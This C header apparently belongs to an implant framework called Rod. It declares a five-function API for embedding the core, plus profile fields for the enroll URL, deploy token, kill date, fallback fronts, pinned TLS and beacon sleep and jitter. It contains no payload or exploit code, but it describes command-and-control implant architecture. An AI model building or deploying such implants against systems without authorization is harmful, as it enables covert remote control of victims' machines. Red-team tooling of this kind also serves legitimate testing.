/*
 * rod_core.h -- the Rod linkable core's C-ABI embedding surface.
 *
 * The reference Rust implant's lib target compiled as a static library
 * (architecture.md Sec 15.2, ADR-018): a shell in any language that can
 * link one writes `main` and a pump loop and gets the whole wire stack --
 * enrollment, the sealed contact cycle, tasking verification, handlers --
 * without implementing the wire protocol and without forking the crate.
 * The middle rung between a Tier 0 implant written from scratch and a
 * crate fork.
 *
 * The surface is five symbols, named rod_core_* to stand beside (never
 * inside) the plugin family's rod_plugin_* set:
 *
 *   rod_core_abi_version()        -- refuse a core that answers another number
 *   rod_core_init_with_profile()  -- build a core from explicit profile fields
 *   rod_core_pump()               -- perform the machine's next due action
 *   rod_core_state()              -- read phase, exit code, wait, identity
 *   rod_core_free()               -- release the handle
 *
 * The drive is cooperative and single-threaded: create, then pump from one
 * thread. Each pump performs one due action (an enroll attempt or a whole
 * contact cycle -- network IO that blocks up to the request timeout) or
 * answers that nothing is due yet; the state read carries the wait the
 * shell owes before the next pump. The core never exits the process,
 * never spawns threads, and writes nothing to stdout; its diagnostics
 * follow the crate's ROD_VERBOSE gate (stderr only). The shell owns the
 * sleeping, the process, and the exit code.
 *
 * Build (Linux):  cargo build --release
 *                 cc -O2 -o my-shell my-shell.c \
 *                    target/release/librod_implant.a -lpthread -lm -ldl
 *
 * The worked shell is shell/main.c beside this header.
 */
#ifndef ROD_CORE_H
#define ROD_CORE_H

#include <stdint.h>

#ifdef __cplusplus
extern "C" {
#endif

#define ROD_CORE_ABI_VERSION 1u

/* The state read's phase discriminants. */
#define ROD_CORE_ENROLLING 1u
#define ROD_CORE_CONTACTING 2u
#define ROD_CORE_DONE 3u

/* Opaque: the machine plus the wait its last step answered. */
typedef struct rod_core rod_core;

/*
 * The construction profile: the dev shape's knobs as explicit fields,
 * read and copied once at init. Strings are NUL-terminated UTF-8 and are
 * not retained; NULL or empty selects the documented default. The
 * required pair is the enroll front and the deploy token; a profile whose
 * gates refuse (that pair incomplete, or a passed kill date) still gets a
 * handle -- already in the done phase, the state's exit code says why
 * (2, the init gates).
 */
typedef struct rod_core_profile {
    uint32_t struct_size;     /* sizeof(rod_core_profile); mismatch refuses */
    const char *enroll_url;   /* required: the walk's primary enroll front */
    const char *deploy_token; /* required: the one-use enrollment token */
    const char *kill_date;    /* RFC-3339; refused past, re-checked per step */
    const char *verbs;        /* comma-separated; empty = the compiled set */
    const char *ca_pem;       /* pinned posture's CA; empty = platform default */
    const char *tls_trust;    /* "pinned" (default) or "public" */
    const char *envelope_key; /* base64 keyId(16)||key(32); empty = plaintext */
    const char *fallback_urls;/* comma-separated fallback fronts */
    const char *mode;         /* "poll" (default) or "stream" */
    double sleep_seconds;     /* contact cadence; <= 0 = the default (30) */
    double jitter_seconds;    /* cadence jitter half-width; < 0 = 0 */
} rod_core_profile;

/*
 * One state read. Set struct_size before the call; a mismatched value
 * answers an error and writes nothing.
 */
typedef struct rod_state {
    uint32_t struct_size;  /* sizeof(rod_state) */
    uint32_t phase;        /* ROD_CORE_ENROLLING / _CONTACTING / _DONE */
    int32_t exit_code;     /* valid once done: 0 clean, 1 failure, 2 gates */
    uint32_t wait_ms;      /* msecs until the next action is due; 0 = now */
    uint64_t contacts;     /* contact cycles crossed since enrollment */
    char implant_id[64];   /* NUL-terminated; empty before enrollment */
} rod_state;

/* The ABI version this core speaks. */
uint32_t rod_core_abi_version(void);

/*
 * Builds a core. NULL only on a malformed argument (null pointer, wrong
 * struct_size); the profile gates answer a done-phase handle instead.
 */
rod_core *rod_core_init_with_profile(const rod_core_profile *profile);

/*
 * Performs the machine's next due action and answers the phase after the
 * step. ROD_CORE_DONE is final; every other phase is pumped again after
 * the wait the state read reports. One thread only.
 */
uint32_t rod_core_pump(rod_core *core);

/* Reads the state: 0 on success, 1 on a malformed argument. */
uint32_t rod_core_state(const rod_core *core, rod_state *out);

/* Releases a handle. */
void rod_core_free(rod_core *core);

#ifdef __cplusplus
}
#endif

#endif /* ROD_CORE_H */
